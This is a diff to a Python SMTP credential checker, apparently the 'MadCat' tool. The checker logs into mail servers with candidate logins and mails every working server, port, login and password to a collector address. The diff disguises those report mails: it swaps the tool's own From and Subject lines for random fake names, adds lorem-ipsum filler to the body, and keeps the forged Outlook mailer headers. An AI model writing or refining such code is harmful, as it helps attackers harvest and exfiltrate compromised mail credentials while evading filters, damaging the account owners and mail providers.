@@ -1,6 +1,11 @@
 #!/usr/local/bin/python3
 
 import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64
+from lorem_text import lorem
+from faker import Faker
+
+fake = Faker()
+
 try:
 	import psutil, requests, dns.resolver
 except ImportError:
@@ -316,7 +321,16 @@ def socket_try_mail(sock, smtp_from, smtp_to, data):
 					return True
 	sock.close()
 	raise Exception(answer)
+	
+def generate_random_text():
+    return lorem.words(random.randint(50, 100))
 
+def generate_random_name():
+    return fake.first_name()
+
+def generate_random_lastname():
+    return fake.last_name()
+	
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
 	global verify_email
 	if is_valid_email(smtp_user):
@@ -332,21 +346,21 @@ def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password
 			s.close()
 			return True
 		headers_arr = [
-			'From: MadCat checker <%s>'%smtp_user,
-			'Resent-From: admin@localhost',
-			'To: '+verify_email,
-			'Subject: new SMTP from MadCat checker',
-			'Return-Path: '+smtp_user,
-			'Reply-To: '+smtp_user,
-			'X-Priority: 1',
-			'X-MSmail-Priority: High',
-			'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-			'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-			'MIME-Version: 1.0',
-			'Content-Type: text/html; charset="utf-8"',
-			'Content-Transfer-Encoding: 8bit'
+			f'From: {generate_random_name()} {generate_random_lastname()} <%s>' % smtp_user,
+    'Resent-From: admin@localhost',
+    'To: ' + verify_email,
+    f'Subject: {generate_random_name()}\'s Important Message',
+    'Return-Path: ' + smtp_user,
+    'Reply-To: ' + smtp_user,
+    'X-Priority: 1',
+    'X-MSmail-Priority: High',
+    'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
+    'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
+    'MIME-Version: 1.0',
+    'Content-Type: text/html; charset="utf-8"',
+    'Content-Transfer-Encoding: 8bit'
 		]
-		body = f'{smtp_server}|{port}|{smtp_login}|{password}'
+		body = f'{smtp_server}|{port}|{smtp_login}|{password}\n\n{generate_random_text()}'
 		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
 		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
 	s.close()
